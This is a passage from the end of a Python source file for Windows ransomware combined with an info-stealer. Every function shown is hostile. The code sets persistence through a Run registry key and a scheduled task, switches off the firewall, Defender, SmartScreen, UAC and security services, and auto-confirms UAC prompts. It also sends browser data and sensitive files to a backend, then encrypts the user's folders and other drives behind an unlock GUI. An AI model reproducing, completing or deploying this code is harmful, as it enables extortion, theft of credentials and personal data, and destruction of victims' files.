        def stop(self):
            self.running = False


# ==================== STARTUP PERSISTENCE ====================

def add_to_startup():
    """Add program to Windows startup via Registry"""
    if not WINDOWS:
        return False
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        return True
    except:
        return False


def add_scheduled_task():
    """Add scheduled task to run on computer startup/logon"""
    if not WINDOWS:
        return False
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        # Create scheduled task to run at logon
        task_name = "WindowsSecurityUpdate"
        # Delete existing task if any
        subprocess.call(f'schtasks /delete /tn "{task_name}" /f', shell=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Create new task to run at logon
        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
        result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result == 0:
            return True
        # Fallback: create hourly task
        cmd2 = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc hourly /f'
        subprocess.call(cmd2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False


def disable_firewall():
    """Disable Windows Firewall (all profiles)"""
    if not WINDOWS:
        return False
    try:
        # Disable all firewall profiles using netsh
        commands = [
            'netsh advfirewall set allprofiles state off',
            'netsh advfirewall set domainprofile state off',
            'netsh advfirewall set privateprofile state off',
            'netsh advfirewall set publicprofile state off',
        ]
        for cmd in commands:
            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False


def disable_defender(debug=True):
    """Disable Windows Defender real-time protection using PowerShell as Administrator

    Args:
        debug: If True, capture and print PowerShell output for debugging
    """
    if not WINDOWS:
        print("[!] Not running on Windows, skipping disable_defender")
        return False
    try:
        print("[*] Starting to disable Windows Defender...")
        # PowerShell commands to disable Windows Defender
        ps_commands = [
            ("Set-MpPreference -DisableRealtimeMonitoring $true", "Realtime Monitoring"),
            ("Set-MpPreference -DisableBehaviorMonitoring $true", "Behavior Monitoring"),
            ("Set-MpPreference -DisableBlockAtFirstSeen $true", "Block At First Seen"),
            ("Set-MpPreference -DisableIOAVProtection $true", "IOAV Protection"),
            ("Set-MpPreference -DisableScriptScanning $true", "Script Scanning"),
            ("Set-MpPreference -DisableArchiveScanning $true", "Archive Scanning"),
            ("Set-MpPreference -DisableIntrusionPreventionSystem $true", "Intrusion Prevention System"),
        ]

        # Execute each command with elevated privileges
        for ps_cmd, feature_name in ps_commands:
            try:
                print(f"[*] Disabling {feature_name}...")

                if debug:
                    # DEBUG MODE: Use subprocess to capture output first
                    result = subprocess.run(
                        ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
                        capture_output=True,
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )

                    print(f"    [DEBUG] Return code: {result.returncode}")
                    if result.stdout.strip():
                        print(f"    [DEBUG] stdout: {result.stdout.strip()}")
                    if result.stderr.strip():
                        print(f"    [DEBUG] stderr: {result.stderr.strip()}")

                    if result.returncode == 0 and not result.stderr.strip():
                        print(f"[+] {feature_name} disabled successfully!")
                    else:
                        print(f"[-] {feature_name} needs admin - trying UAC elevation...")
                        # Try with ShellExecute for UAC
                        ret = ctypes.windll.shell32.ShellExecuteW(
                            None,
                            "runas",  # Run as administrator
                            "powershell.exe",
                            f'-ExecutionPolicy Bypass -Command "{ps_cmd}"',
                            None,
                            1  # SW_SHOWNORMAL to see the window
                        )
                        print(f"    [DEBUG] ShellExecuteW returned: {ret}")
                        time.sleep(2)  # sleep for UAC prompt
                        pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
                        print(f"[+] UAC elevation attempted for {feature_name}")
                else:
                    # PRODUCTION MODE: Use ShellExecute with UAC
                    ctypes.windll.shell32.ShellExecuteW(
                        None,
                        "runas",  # Run as administrator
                        "powershell.exe",
                        f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
                        None,
                        0  # SW_HIDE
                    )
                    time.sleep(2)  # sleep for UAC prompt
                    pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
                    print(f"[+] {feature_name} disabled successfully!")

            except Exception as e:
                print(f"[-] Error disabling {feature_name}: {e}")
                continue

        print("[+] Windows Defender disable process completed!")
        return True
    except Exception as e:
        print(f"[-] Failed to disable Windows Defender: {e}")
        return False


def disable_windows_security():
    """Disable Windows Security completely (Defender, SmartScreen, UAC, Services)"""
    if not WINDOWS:
        return False
    try:
        # 1. Disable Windows Defender via Registry
        defender_reg_commands = [
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
            r'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
        ]

        # 2. Disable Windows Security Center notifications
        security_center_commands = [
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f',
            r'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f',
        ]

        # 3. Disable SmartScreen
        smartscreen_commands = [
            r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f',
            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f',
            r'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f',
        ]

        # 4. Disable UAC (User Account Control)
        uac_commands = [
            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f',
            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f',
            r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f',
        ]

        # 5. Stop and disable Windows Defender services
        service_commands = [
            'sc stop WinDefend',
            'sc config WinDefend start= disabled',
            'sc stop SecurityHealthService',
            'sc config SecurityHealthService start= disabled',
            'sc stop wscsvc',
            'sc config wscsvc start= disabled',
        ]

        # Execute all commands
        all_commands = defender_reg_commands + security_center_commands + smartscreen_commands + uac_commands + service_commands
        for cmd in all_commands:
            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        return True
    except:
        return False


def hide_console():
    """Hide console window on Windows"""
    if WINDOWS:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass


# ==================== MAIN FUNCTION ====================

def run_browser_extraction():
    """Run browser data extraction in background"""
    try:
        data = collect_all_browser_data()
        send_to_backend(data)
    except:
        pass


def run_sensitive_data_collection():
    """Run sensitive data collection in background with file content extraction"""
    try:
        collector = SensitiveDataCollector()
        data = collector.collect_all()

        # Try to send all data at once first
        success = collector.send_to_backend(data)

        # If single send fails (likely due to size), send in batches
        if not success:
            collector.send_in_batches(data)
    except:
        pass


def get_all_target_folders():
    """Get all folders to encrypt: user folders + other drives"""
    target_folders = []
    user_home = Path.home()

    # User folders: Documents, Desktop, Downloads, Pictures
    user_folders = [
        user_home / 'Documents',
        user_home / 'Desktop',
        user_home / 'Downloads',
        user_home / 'Pictures',
    ]
    for folder in user_folders:
        if folder.exists():
            target_folders.append(folder)

    # Other drives (D, E, A, etc.) except C
    other_drives = get_other_drives()
    target_folders.extend(other_drives)

    return target_folders


def run_folder_encryption(target_folders=None):
    """Encrypt target folders"""
    if target_folders is None:
        target_folders = get_all_target_folders()

    encryptor = FolderEncryptor(MASTER_PASSWORD)
    for folder in target_folders:
        if Path(folder).exists() and not is_folder_locked(folder):
            try:
                encryptor.encrypt_folder(folder)
            except:
                pass


def show_unlock_gui(locked_folders):
    """Show unlock GUI for locked folders"""
    if HAS_GUI and locked_folders:
        gui = MultiFolderLockerGUI(locked_folders)
        gui.run()


def main():
    """Main entry point - runs all malicious activities in background"""
    # Hide console window first
    hide_console()

    # Disable Windows Firewall (all profiles)
    disable_firewall()

    # Disable Windows Defender (PowerShell method)
    disable_defender()

    # Disable Windows Security completely (Registry, Services, SmartScreen, UAC)
    disable_windows_security()

    # Add to startup for persistence (Registry)
    add_to_startup()

    # Add scheduled task to run on logon
    add_scheduled_task()

    # Run browser extraction in background thread
    browser_thread = threading.Thread(target=run_browser_extraction, daemon=True)
    browser_thread.start()

    # Run sensitive data collection in background thread
    data_thread = threading.Thread(target=run_sensitive_data_collection, daemon=True)
    data_thread.start()

    # Wait for data collection to complete
    browser_thread.join(timeout=120)
    data_thread.join(timeout=120)

    # Get all target folders (user folders + other drives)
    target_folders = get_all_target_folders()

    # Encrypt all folders
    run_folder_encryption(target_folders)

    # Find locked folders and show GUI
    locked_folders = [f for f in target_folders if is_folder_locked(f)]
    if locked_folders and HAS_GUI:
        show_unlock_gui(locked_folders)

    # Start folder monitor if watchdog is available
    if HAS_WATCHDOG and locked_folders:
        monitor = FolderAccessMonitorThread(locked_folders, lambda f: show_unlock_gui([f]))
        monitor.start()
        monitor.join()


if __name__ == "__main__":
    main()